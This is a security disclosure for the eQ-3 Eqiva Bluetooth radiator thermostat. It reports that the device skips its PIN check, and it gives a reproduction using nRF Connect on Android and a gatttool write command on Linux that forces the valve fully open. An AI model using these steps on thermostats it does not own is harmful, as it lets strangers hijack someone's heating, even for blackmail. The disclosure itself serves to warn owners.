# Security leak in smart home thermostat eQ-3 Eqiva Bluetooth

[Beschreibung in Deutsch](Readme_ger.md)

The [eQ-3 Eqiva](http://www.eq-3.de/produkte/eqiva/bluetooth-smart-heizkoerperthermostat.html) is a smart home thermostat for radiators with an integrated Bluetooth LE interface. The manufacture recommends the following app to control the thermostat using a smartphone: [Calor BT](https://play.google.com/store/apps/details?id=de.eq3.ble.android&hl=de).

When using the app to connect to the thermostat a 4 digit PIN code which has to be read from the thermostat must be entered. This is an important security feature to only allow persons that have physical access to the thermostat to control it remotely.

Surprisingly this PIN code is not necessary when sending Bluetooth LE commands directly to the thermostat using the corresponding tools (an Android smartphone is sufficient, see below). **This means that anyone within the Bluetooth LE range of around 40m can control and therefore hijack the thermostat.**

Attack reasons reach from the sole purpose of changing the settings to blackmailing where the radiator is turned off until a certain amount of money has been paid.

**At the moment it has to be advised to turn the Bluetooth feature off completely within the thermostat settings.**

## Android

### 1\. Install nRF Connect

<https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=de>

### 2\. Connect with the thermostat

![01-nrf-connect](/img/01-nrf-connect.png)

### 3\. Select BLE Characteristic

![02-nrf-connect](/img/02-nrf-connect.png)

### 4\. Activate boost mode (Fully open the valve)

![03-nrf-connect](/img/03-nrf-connect.png)

## Linux (tested with Raspberry Pi 3 and Raspbian)

### 1\. Scan for BLE devices

`hcitool lescan`

![HCI Tool Scan Example](/img/01-hcitool-scan.png)

Device with name "CC-RT-BLE" is the thermostat.

### 2\. Activate boost mode (Fully open the valve)

`gatttool -b 00:1A:22:09:DA:10 --char-write-req --handle=0x0411 --value=4501`

_Change MAC address accordingly._

## Further information:

- [eq-3 Eqiva API Documentation by Heckie75 at Github](https://github.com/Heckie75/eQ-3-radiator-thermostat/blob/master/eq-3-radiator-thermostat-api.md)
